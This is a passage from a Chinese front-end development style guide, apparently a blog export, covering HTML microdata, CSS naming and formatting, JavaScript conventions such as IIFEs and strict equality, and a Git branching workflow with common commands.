和可用性环境条件允许的话，建议考虑采用微格式。微格式是通过在元素标签上申明一系列特定数据来达成特定语义的方法。 谷歌、微软和雅虎对如何使用这些额外的数据一定程度上的达成一致，如果正确的使用，这将给搜索引擎优化带来巨大的好处。 你可以访问 schema.org 获得更多内容细节。 看一个电影网站的简单例子： 不带微格式 123456&lt;div&gt; &lt;h1&gt;Avatar&lt;/h1&gt; &lt;span&gt;Director: James Cameron (born August 16, 1954)&lt;/span&gt; &lt;span&gt;Science fiction&lt;/span&gt; &lt;a href=\"../movies/avatar-theatrical-trailer.html\"&gt;Trailer&lt;/a&gt;&lt;/div&gt; 带有微格式 12345678&lt;div itemscope itemtype =\"http://schema.org/Movie\"&gt; &lt;h1 itemprop=\"name\"&gt;Avatar&lt;/h1&gt; &lt;div itemprop=\"director\" itemscope itemtype=\"http://schema.org/Person\"&gt; Director: &lt;span itemprop=\"name\"&gt;James Cameron&lt;/span&gt; (born &lt;span itemprop=\"birthDate\"&gt;August 16, 1954)&lt;/span&gt; &lt;/div&gt; &lt;span itemprop=\"genre\"&gt;Science fiction&lt;/span&gt; &lt;a href=\"../movies/avatar-theatrical-trailer.html\" itemprop=\"trailer\"&gt;Trailer&lt;/a&gt;&lt;/div&gt; ID 和锚点通常一个比较好的做法是将页面内所有的头部标题元素都加上 ID. 这样做，页面 URL 的 hash 中带上对应的 ID 名称，即形成描点，方便跳转至对应元素所处位置。 格式化规则在每一个块状元素，列表元素和表格元素后，加上一新空白行，并对其子孙元素进行缩进。内联元素写在一行内，块状元素还有列表和表格要另起一行。 （如果由于换行的空格引发了不可预计的问题，那将所有元素并入一行也是可以接受的，格式警告总好过错误警告）。 推荐 123456789101112131415161718192021222324&lt;blockquote&gt; &lt;p&gt;&lt;em&gt;Space&lt;/em&gt;, the final frontier.&lt;/p&gt;&lt;/blockquote&gt; &lt;ul&gt; &lt;li&gt;Moe&lt;/li&gt; &lt;li&gt;Larry&lt;/li&gt; &lt;li&gt;Curly&lt;/li&gt;&lt;/ul&gt; &lt;table&gt; &lt;thead&gt; &lt;tr&gt; &lt;th scope=\"col\"&gt;Income&lt;/th&gt; &lt;th scope=\"col\"&gt;Taxes&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;$ 5.00&lt;/td&gt; &lt;td&gt;$ 4.50&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt; HTML 引号使用双引号(“”) 而不是单引号(”) 。 CSS规范class 命名 class 名称中只能出现小写字符和破折号（dashe）（不是下划线，也不是驼峰命名法）。破折号应当用于相关 class 的命名（类似于命名空间）（例如，.btn 和 .btn-danger）。 避免过度任意的简写。.btn 代表 button，但是 .s 不能表达任何意思。 class 名称应当尽可能短，并且意义明确。 使用有意义的名称。使用有组织的或目的明确的名称，不要使用表现形式（presentational）的名称。 基于最近的父 class 或基本（base） class 作为新 class 的前缀。 使用 .js-* class 来标识行为（与样式相对），并且不要将这些 class 包含到 CSS 文件中。 在为 Sass 和 Less 变量命名时也可以参考上面列出的各项规范。 不推荐 123.t &#123; ... &#125;.red &#123; ... &#125;.header &#123; ... &#125; 推荐 123.tweet &#123; ... &#125;.important &#123; ... &#125;.tweet-header &#123; ... &#125; css代码组织（按块书写css样式） 以组件为单位组织代码段。 制定一致的注释规范。 使用一致的空白符将代码分隔成块，这样利于扫描较大的文档。 如果使用了多个 CSS 文件，将其按照组件而非页面的形式分拆，因为页面会被重组，而组件只会被移动。 把父类下边所有的子类都写在父类后边，兄弟类同级，类似于一颗大树，分支条理清晰。 推荐 12345678910111213141516171819202122232425/*第一屏*/.screen01 &#123; width: 100%; height: 100%; position: relative; background: url(\"../images/01-bg.png\") no-repeat center bottom;&#125;.screen01 .text &#123; width: 470px; height: 50px; position: absolute; left: 50%; margin-left: -235px; transform: translate(250px,100px); animation: screen01-text 0.75s linear infinite alternate;&#125;.screen01 .sofa &#123; width: 134px; height: 147px; position: absolute; left: 50%; margin-left: -67px; transform: translate(-160px,200px); animation: screen01-sofa 1s linear infinite alternate;&#125; 合理的避免使用ID一般情况下ID不应该被应用于样式。ID的样式不能被复用并且每个页面中你只能使用一次ID。使用ID唯一有效的是确定网页或整个站点中的位置。尽管如此，你应该始终考虑使用class，而不是id，除非只使用一次。 CSS选择器中避免标签名及合理的语义类名当构建选择器时应该使用清晰， 准确和有语义的class(类)名。不要使用标签选择器。 如果你只关心你的class(类)名，而不是你的代码元素，这样会更容易维护。 从分离的角度考虑,在表现层中不应该分配html标记/语义。它可能是一个有序列表需要被改成一个无序列表，或者一个div将被转换成article。如果你只使用具有实际意义的class(类)名，并且不使用元素选择器，那么你只需要改变你的html标记，而不用改动你的CSS。 尽可能的精确很多前端开发人员写选择器链的时候不使用 直接子选择器（注：直接子选择器和后代选择器的区别）。有时，这可能会导致疼痛的设计问题并且有时候可能会很耗性能。然而，在任何情况下，这是一个非常不好的做法。如果你不写很通用的，需要匹配到DOM末端的选择器， 你应该总是考虑直接子选择器。 缩写属性CSS提供了各种缩写属性（如 font 字体）应该尽可能使用，即使在只设置一个值的情况下。 使用缩写属性对于代码效率和可读性是有很有用的。 不推荐 12345678border-top-style: none;font-family: palatino, georgia, serif;font-size: 100%;line-height: 1.6;padding-bottom: 2em;padding-left: 1em;padding-right: 1em;padding-top: 0; 推荐 123border-top: 0;font: 100%/1.6 palatino, georgia, serif;padding: 0 1em 2em; 0 和 单位省略“0”值后面的单位。不要在0值后面使用单位，除非有值。 对于属性值或颜色参数，省略小于 1 的小数前面的 0 （例如，.5代替 0.5；-.5px 代替 -0.5px ）。 不推荐 12padding-bottom: 0px;margin: 0em; 推荐 12padding-bottom: 0;margin: 0; 十六进制表示法在可能的情况下，使用3个字符的十六进制表示法。颜色值允许这样表示，3个字符的十六进制表示法更简短。 始终使用小写的十六进制数字。 不推荐 1color: #FF33AA; 推荐 1color: #f3a; 声明结束和属性名结束为了保证一致性和可扩展性，每个声明应该用分号结束，每个声明换行。 属性名的冒号后使用一个空格。出于一致性的原因，属性和值（但属性和冒号之间没有空格）的之间始终使用一个空格。 不推荐 123.test &#123; display: block; height:100px&#125; 推荐 1234.test &#123; display: block; height: 100px;&#125; 规则分隔规则之间始终有一个空行（双换行符）分隔。 推荐 12345678html &#123; background: #fff;&#125; body &#123; margin: auto; width: 50%;&#125; CSS引号属性选择器或属性值用双引号（””），而不是单引号（”）括起来。URI值（url()）不要使用引号。 不推荐 123456789@import url('//cdn.com/foundation.css'); html &#123; font-family: 'open sans', arial, sans-serif;&#125; body:after &#123; content: 'pause';&#125; 推荐 123456789@import url(//cdn.com/foundation.css); html &#123; font-family: \"open sans\", arial, sans-serif;&#125; body:after &#123; content: \"pause\";&#125; 属性顺序HTML 属性应当按照以下给出的顺序依次排列，确保代码的易读性。 class id, name data-* src, for, type, href, value title, alt role, aria-* class 用于标识高度可复用组件，因此应该排在首位。id 用于标识具体组件，应当谨慎使用（例如，页面内的书签），因此排在第二位。 Less 和 Sass 中的嵌套避免不必要的嵌套。这是因为虽然你可以使用嵌套，但是并不意味着应该使用嵌套。只有在必须将样式限制在父元素内（也就是后代选择器），并且存在多个需要嵌套的元素时才使用嵌套。 Less 和 Sass 中的操作符为了提高可读性，在圆括号中的数学计算表达式的数值、变量和操作符之间均添加一个空格。 JavaScript规范变量声明总是使用 var 来声明变量。如不指定 var，变量将被隐式地声明为全局变量，这将对变量难以控制。如果没有声明，变量处于什么定义域就变得不清（可以是在 Document 或 Window 中，也可以很容易地进入本地定义域）。所以，请总是使用 var 来声明变量。 ES6中有了模块作用域，也就是let(声明变量)和const(声明常量) 。如果采用前端工程化开发，使用到了ES6，推荐使用let和const。 采用严格模式带来的好处是，当你手误输入错误的变量名时，它可以通过报错信息来帮助你定位错误出处。 不推荐 12x = 10;y = 100; 推荐 12var x = 10, y = 100; 全局命名空间污染与 IIFE总是将代码包裹成一个 IIFE(Immediately-Invoked Function Expression)，用以创建独立隔绝的定义域。这一举措可防止全局命名空间被污染。 IIFE 还可确保你的代码不会轻易被其它全局命名空间里的代码所修改（i.e. 第三方库，window 引用，被覆盖的未定义的关键字等等）。 不推荐 1234var x = 10, y = 100; console.log(window.x + ' ' + window.y); 推荐 123456789(function(log, w, undefined)&#123; 'use strict'; var x = 10, y = 100; log((w.x === undefined) + ' ' + (w.y === undefined)); &#125;(window.console.log, window)); IIFE（立即执行的函数表达式）无论何时，想要创建一个新的封闭的定义域，那就用 IIFE。它不仅避免了干扰，也使得内存在执行完后立即释放。 所有脚本文件建议都从 IIFE 开始。 立即执行的函数表达式的执行括号应该写在外包括号内。虽然写在内还是写在外都是有效的，但写在内使得整个表达式看起来更像一个整体，因此推荐这么做。 不推荐 1(function()&#123;&#125;)(); 推荐 1(function()&#123;&#125;()); so，用下列写法来格式化你的 IIFE 代码： 123456(function()&#123; 'use strict'; // Code goes here &#125;()); 如果你想引用全局变量或者是外层 IIFE 的变量，可以通过下列方式传参： 1234567(function($, w, d)&#123; 'use strict'; $(function() &#123; w.alert(d.querySelectorAll('div').length); &#125;);&#125;(jQuery, window, document)); 总是使用带类型判断的比较判断总是使用 === 精确的比较操作符，避免在判断的过程中，由 JavaScript 的强制类型转换所造成的困扰。 如果你使用 === 操作符，那比较的双方必须是同一类型为前提的条件下才会有效。 如果你想了解更多关于强制类型转换的信息，你可以读一读 Dmitry Soshnikov 的这篇文章。 在只使用 == 的情况下，JavaScript 所带来的强制类型转换使得判断结果跟踪变得复杂，下面的例子可以看出这样的结果有多怪了： 1234567891011121314151617(function(log)&#123; 'use strict'; log('0' == 0); // true log('' == false); // true log('1' == true); // true log(null == undefined); // true var x = &#123; valueOf: function() &#123; return 'X'; &#125; &#125;; log(x == 'X'); &#125;(window.console.log)); 明智地使用真假判断当我们在一个 if 条件语句中使用变量或表达式时，会做真假判断。if(a == true) 是不同于 if(a)的。后者的判断比较特殊，我们称其为真假判断。这种判断会通过特殊的操作将其转换为 true 或 false，下列表达式统统返回 false：false, 0, undefined, null, NaN, &#39;&#39;（空字符串）. 这种真假判断在我们只求结果而不关心过程的情况下，非常的有帮助。 以下示例展示了真假判断是如何工作的： 12345678910111213141516171819202122232425(function(log)&#123; 'use strict'; function logTruthyFalsy(expr) &#123; if(expr) &#123; log('truthy'); &#125; else &#123; log('falsy'); &#125; &#125; logTruthyFalsy(true); // truthy logTruthyFalsy(1); // truthy logTruthyFalsy(&#123;&#125;); // truthy logTruthyFalsy([]); // truthy logTruthyFalsy('0'); // truthy logTruthyFalsy(false); // falsy logTruthyFalsy(0); // falsy logTruthyFalsy(undefined); // falsy logTruthyFalsy(null); // falsy logTruthyFalsy(NaN); // falsy logTruthyFalsy(''); // falsy &#125;(window.console.log)); 变量赋值时的逻辑操作逻辑操作符 || 和 &amp;&amp; 也可被用来返回布尔值。如果操作对象为非布尔对象，那每个表达式将会被自左向右地做真假判断。基于此操作，最终总有一个表达式被返回回来。这在变量赋值时，是可以用来简化你的代码的。参考 不推荐 1234567if(!x) &#123; if(!y) &#123; x = 1; &#125; else &#123; x = y; &#125;&#125; 推荐 1x = x || y || 1; 这一小技巧经常用来给方法设定默认的参数。 12345678910111213141516(function(log)&#123; 'use strict'; function multiply(a, b) &#123; a = a || 1; b = b || 1; log('Result ' + a * b); &#125; multiply(); // Result 1 multiply(10); // Result 10 multiply(3, NaN); // Result 3 multiply(9, 5); // Result 45 &#125;(window.console.log)); 阻止兼容模式有时候 IE 会在用户不知道的情况下自作主张切换到兼容模式。要阻止你的站点缺省进入兼容模式，可以在站点的&lt;head&gt; 部分加入下列代码： 1&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt; 优化 JavaScript 的特征 编写可维护的代码 单变量模式 Hoisting：把所有变量声明统一放到函数的起始位置 （在后部声明的变量也会被JS视为在头部定义，由此会产生问题） 不要扩充内置原型（虽然给Object(), Function()之类的内置原型增加属性和方法很巧妙，但是会破坏可维护性） 不要用隐含的类型转换 不要用 eval() 用 parseInt() 进行数字转换 （规范）左大括号的位置 构造器首字母大写 写注释 不要用 void 不要用 with 语句 不要用 continue 语句 尽量不要用位运算 GIT开发规范设置和初始化工作：全局编码设置：统一采用utf-8， 请检查自己的编码，编码不一致可能会导致没实际上没更改的文档也会显示为更新。查看设置：git config -l 设置编码： 123git config --global gui.encoding utf-8git config --global i18n.commitencoding utf-8git config --global i18n.logoutputencoding utf-8 设置用户名和email： 12git config --global user.name 用户名git config --global user.email 邮箱 开发流程项目分支一般来说，互联网项目有线上/预上线分支（master），测试分支（stable），开发分支（dev）等． 保证不同的分支做不同的事情，防止分支污染。 线上/预上线分支（master）：是预上线环境和线上环境的分支，以这个分支为准，其他分支都是以这个分支为基础拉取。 测试分支（stable）：测试环境分支，是给测试团队测试使用，如果有些功能在本地及开发不容易测试，开发人员可以测试分支进行自测。 开发分支（dev）：开发人员自测。 开发流程步骤： 第一步，新需求或BUG，从上线分支拉取一个开发分支。 第二步，在开发分支进行开发，自测。 第三步，合并到测试分支，通知QA测试。 第四步，如果通过测试，合并到master，然后继续测试。如果不通过测试，进入第二步。 第五步，如果预上线测试通过，将预上线tag 直接部署到线上。如果不通过测试，进入第二步。 第六步，上线，然后线上测试。如果通过测试，那么这个需求开发就结束了。如果没有通过测试，就回归上一版本，然后进入第二步。 当遇到一个新需求或者更改BUG时，必须重新建立分支 123456# 获取主干最新代码git checkout mastergit pull# 新建一个开发分支myfeature并切换到这个分支git checkout -b myfeature 当修改完毕后，提交分支 12345678# 查看发生变动的文件git status# 保存所有变化（包括新建、修改和删除）git add .# 撰写提交信息git commit -m \"修改样式错位\" 将本地分支推送至远程仓库 提交后合并到stable 提测 12345git push# 切换到stable分支 合并git checkout stablegit merge myfeature 如果通过测试则合并到master，去公司的git地址创建合并请求，等待master管理员合并未通过测试，则继续修改重新测试 命令汇总git config配置本地仓库 常用git config –global user.name、git config –global user.email git config –list查看配置详情 git init 初始一个仓库，添加–bare可以初始化一个共享（裸）仓库 git status 可以查看当前仓库的状态 git add&quot;文件&quot; 将工作区中的文件添加到暂存区中，其中file可是一个单独的文件，也可以是一个目录、&quot;*&quot;、-A git commit -m “备注信息&#39; 将暂存区的文件，提交到本地仓库 git log 可以查看本地仓库的提交历史 git branch查看分支 git branch&quot;分支名称&quot; 创建一个新的分支 git checkout&quot;分支名称&quot; 切换分支 git checkout -b deeveloper 新建并切到developer分支 git merge&quot;分支名称&quot; 合并分支 git branch -d &quot;分支名称&quot; 删除分支 git clone &quot;仓库地址&quot;获取已有仓库的副本 git push origin &quot;本地分支名称:远程分支名称&quot;将本地分支推送至远程仓库， git push origin hotfix（通常的写法）相当于 git push origin hotfix:hotfix git push origin hotfix:newfeature 本地仓库分支名称和远程仓库分支名称一样的情况下可以简写成一个，即git push &quot;仓库地址&quot; &quot;分支名称&quot;，如果远程仓库没有对应分支，将会自动创建 git remote add &quot;主机名称&quot; &quot;远程仓库地址&quot;添加远程主机，即给远程主机起个别名，方便使用 git remote 可以查看已添加的远程主机 git remote show &quot;主机名称&quot;可以查看远程主机的信息 GitLib权限管理GitLib有五种身份权限，分别是： Owner 项目所有者，拥有所有的操作权限 Master 项目的管理者，除更改、删除项目元信息外其它操作均可 Developer 项目的开发人员，做一些开发工作，对受保护内容无权限 Reporter 项目的报告者，只有项目的读权限，可以创建代码片断 Guest 项目的游客，只能提交问题和评论内容 具体参见GitLab权限，为项目添加成员时可指定成员的身份权限 Git高级熟悉掌握以上操作，基本上是可以满足日常开的需要的，但是在解决一些特殊问题时，就又需要我们能够掌握更多的命令。 git ignore忽略文件在项目根目录下创建一个.gitignore文件，可以将不希望提交的罗列在这个文件里，如项目的配置文件、node_modules等 https://github.com/github/gitignore 比较差异当内容被修改，我们无法确定修改哪些内容时，可以通过git diff来进行差异比较。 git difftool 比较的是工作区和暂存的差异 git difftool &quot;SHA&quot;比较与特定提交的差异 git difftool &quot;SHA&quot;&quot;SHA&quot;比较某两次提交的差异 git difftool 分支名称 比较与某个分支的差异 回滚（撤销）操作 HEAD 默认指向当前分支的&quot;末端&quot;，即最后的一次提交，但是我们通过git reset 可以改变HEAD的指向。 稍微复杂一些，理解就好 1、git reset –hard 工作区会变、历史(HEAD)会变， 暂存区也变 –soft 只会变历史(HEAD) –mixed（默认是这个选项）历史(HEAD)会变、暂存区也变，工作区不变 2、git checkout git checkout SHA – &quot;某个文件&quot;，代表只是从SHA这个版中取出特定的文件， 和git reset 是有区别的，reset 重写了历史，checkout 则没有。 更新仓库在项目开发过程中，经常性的会遇到远程（共享）仓库和本地仓库不一致，我们可以通过git fetch 命令来更新本地仓库，使本地仓库和远程（共享）仓库保持一致。 git fetch &quot;远程主机&quot; 或者 git fetch &quot;远程主机&quot; &quot;分支名称&quot; 我们要注意的是，利用git fetch 获取的更新会保存在本地仓库中，但是并没有体现到我们的工作目录中，需要我们再次利用git merge来将对应的分支合并（融合）到特定分支。如下 git pull origin 某个分支， 上操作相当于下面两步 git fetch git merge origin/某个分支 查看远程主机上总共有多少个分支 git branch -a 便可以查看所有(本地+远程仓库)分支了 其它删除远程分支git push origin –delete 分支名称 删除远程分支git push origin :分支名称","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]}]}